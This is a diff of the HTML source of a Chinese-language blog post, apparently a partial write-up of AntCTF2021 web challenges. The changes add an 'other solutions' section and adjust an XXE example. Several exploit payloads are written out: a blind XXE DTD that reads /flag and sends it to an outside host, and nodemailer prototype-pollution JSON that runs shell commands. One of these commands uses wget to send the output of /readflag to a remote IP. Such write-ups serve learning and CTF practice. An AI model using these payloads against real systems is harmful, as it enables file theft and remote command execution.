@@ -5,18 +5,18 @@
     
     <title>AntCTF2021 部分WP | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过     AntCTF2021 部分WP AntCTF结束了，抱群里大腿">
+    <meta name="description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AntCTF2021 部分WP">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20210309-ant2021.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过     AntCTF2021 部分WP AntCTF结束了，抱群里大腿">
+<meta property="og:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
 <meta property="og:image" content="http://120.78.185.175/img/thumbnails/cat.jpg">
-<meta property="og:updated_time" content="2021-03-09T11:17:46.355Z">
+<meta property="og:updated_time" content="2021-03-10T07:35:20.003Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AntCTF2021 部分WP">
-<meta name="twitter:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过     AntCTF2021 部分WP AntCTF结束了，抱群里大腿">
+<meta name="twitter:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
 <meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/cat.jpg">
     
 
@@ -273,6 +273,11 @@ ga('send', 'pageview');
 <li><a href="#nodemailer库文档学习任意文件读取">nodemailer库文档学习，任意文件读取</a></li>
 <li><a href="#shvl原型链污染漏洞patch的绕过">shvl原型链污染漏洞patch的绕过</a></li>
 <li><a href="#原型链污染链挖掘与艰难的绕过">原型链污染链挖掘与艰难的绕过</a></li>
+<li><a href="#其他的解法">其他的解法</a>
+<ul>
+<li><a href="#dnslog">dnslog</a></li>
+<li><a href="#污染-shell-参数">污染 <code>shell</code> 参数</a></li>
+</ul></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -305,7 +310,7 @@ ga('send', 'pageview');
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">POST</span> <span class="string">/upload</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: fn10051969.serverless.cloud.d3ctf.io</div><div class="line"><span class="attribute">User-Agent</span>: xxx</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Referer</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io/</div><div class="line"><span class="attribute">Content-Type</span>: application/json</div><div class="line"><span class="attribute">Origin</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io</div><div class="line"><span class="attribute">Content-Length</span>: 82</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">DNT</span>: 1</div><div class="line"><span class="attribute">Sec-GPC</span>: 1</div><div class="line"></div><div class="line">&#123;"endpoint":"xxx_url","key":"xxx","bucket":"xxx","file":"xxx"&#125;</div></pre></td></tr></table></figure>
 <p>开始的时候没啥头绪，尝试直接访问oss，发现返回了XML。猜测客户端将文件发送到oss，之后oss返回的XML会被客户端解析，所以可能有XXE。</p>
 <p>直接一波老生常谈的XXE盲打（oss伪造服务器使用<a href="https://requestrepo.com/" class="uri" target="_blank" rel="external">https://requestrepo.com/</a>搭建， <code>Content-Type</code> 改为 <code>application/xml</code> ，注意！要把状态码改为404，因为原oss就是返回了404，否则客户端不会解析XML）：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://xxx/data.dtd"&gt;</span></div><div class="line"><span class="meta">%dtd; %payload; %send;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0"?&gt; </div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://xxx/data.dtd"&gt;</span></div><div class="line"><span class="meta">%dtd; %payload; %send;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
 <p>vps:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxx/?data=%file;'&gt;"&gt;</div></pre></td></tr></table></figure>
 <p>把endpoint改为requestrepo的url之后在apache日志中找到flag：</p>
@@ -367,7 +372,7 @@ ga('send', 'pageview');
 <figure>
 <img src="http://120.78.185.175/img/blogimg/antctf2021/dne.png" alt="does not exist"><figcaption>does not exist</figcaption>
 </figure>
-<p>没有bash就不太好反弹shell了，此外，环境还有其他各种限制，并且由于是参数执行，不能dnslog，看hint： <code>PS: Try to execute /readflag</code> ，结合之前sendmail的任意文件读取，可以先把执行结果写入文件，再把文件传到邮箱里。</p>
+<p>没有bash就不太好反弹shell了，此外，环境还有其他各种限制，看hint： <code>PS: Try to execute /readflag</code> ，结合之前sendmail的任意文件读取，可以先把执行结果写入文件，再把文件传到邮箱里。</p>
 <p>先发post包执行命令：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"to"</span>: <span class="string">"hachp1@qq.com"</span>,</div><div class="line">    <span class="attr">"subject"</span>: <span class="string">"test"</span>,</div><div class="line">    <span class="attr">"text"</span>: <span class="string">"xxxx"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"constructor.prototype.path"</span>: <span class="string">"sh"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.args"</span>: [</div><div class="line">        <span class="string">"-c"</span>,</div><div class="line">        <span class="string">"/readflag&gt;/tmp/1"</span></div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>sendmail读文件：</p>
@@ -376,6 +381,18 @@ ga('send', 'pageview');
 <figure>
 <img src="http://120.78.185.175/img/blogimg/antctf2021/8bitflag.png" alt="flag"><figcaption>flag</figcaption>
 </figure>
+<h3 id="其他的解法">其他的解法</h3>
+<p>看其他战队的WP，发现还有其他的解法，可以使用dnslog、污染shell参数等。</p>
+<h4 id="dnslog">dnslog</h4>
+<ul>
+<li>参考<a href="https://mp.weixin.qq.com/s/oOf0RI6P2hEwtPXWP6yU4Q" target="_blank" rel="external">ChaMd5战队</a>，不用再发邮件了：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>:<span class="literal">true</span>,</div><div class="line">    <span class="attr">"constructor.prototype.path"</span>:<span class="string">"sh"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.args"</span>:[</div><div class="line">        <span class="string">"-c"</span>,<span class="string">"wget ip/`/readflag`"</span></div><div class="line">        ]</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<h4 id="污染-shell-参数">污染 <code>shell</code> 参数</h4>
+<ul>
+<li>参考<a href="https://mp.weixin.qq.com/s/-hmAI1P4GClqoXsQS9HInA" target="_blank" rel="external">北极星战队</a>，<code>spawn</code>的shell参数可以指定shell的程序：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>: <span class="number">1</span>,</div><div class="line">    <span class="attr">"constructor.prototype.shell"</span>: <span class="string">"/bin/sh"</span>, </div><div class="line">    <span class="attr">"constructor.prototype.path"</span>: <span class="string">"/readflag &gt; /tmp/jjjjjjjjJrXnm"</span>, </div><div class="line">    <span class="attr">"constructor.prototype.args"</span>: [<span class="string">""</span>]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 
         
         </div>
